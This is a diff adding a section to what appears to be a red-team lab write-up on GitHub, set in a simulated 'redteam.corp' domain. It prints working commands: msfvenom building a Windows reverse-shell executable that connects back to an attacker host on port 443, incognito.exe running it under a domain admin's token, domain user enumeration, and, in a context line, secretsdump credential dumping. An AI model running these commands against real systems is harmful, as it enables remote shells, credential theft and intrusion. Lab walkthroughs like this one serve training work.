@@ -431,3 +431,31 @@ proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -has
 ![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1702a323-aff8-420e-8bb9-edadb97f5995)
 
 Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.
+
+## windows/shell_reverse_tcp - binary-jupin.exe and incognito.exe
+
+Creating my reverse shell using msfvenom and send it to the compromised child-admin machine along with the incognito.exe
+
+```bash
+sudo msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=172.16.250.4 LPORT=443 -f exe -o binary-jupin.exe
+```
+![Screenshot 2023-07-08 at 8 55 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/59223b00-1078-4f6d-8bd5-a4354217ae0c)
+![Screenshot 2023-07-08 at 10 02 49 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5031d2b5-5975-4b3c-8781-8c7d7be8bcc1)
+
+Execute the incognito.exe and my crafted reverse shell.
+
+```bash
+incognito.exe execute -c "child.redteam.corp\child-admin" C:\Users\Public\binary-jupin.exe
+```
+
+I got the shell listening on port 443 which I setup in my crafted reverse shell.
+
+![Screenshot 2023-07-08 at 9 05 07 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/16306778-4cb4-4ad6-984d-80149a23c0c0)
+
+Initiate enumeration on the spawned shell at port 443 and did get the same domain users information.
+
+```bash
+net user /domain
+```
+![Screenshot 2023-07-08 at 9 08 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/fe82d5ed-5a5b-4953-aa57-b7aab73a347f)
+
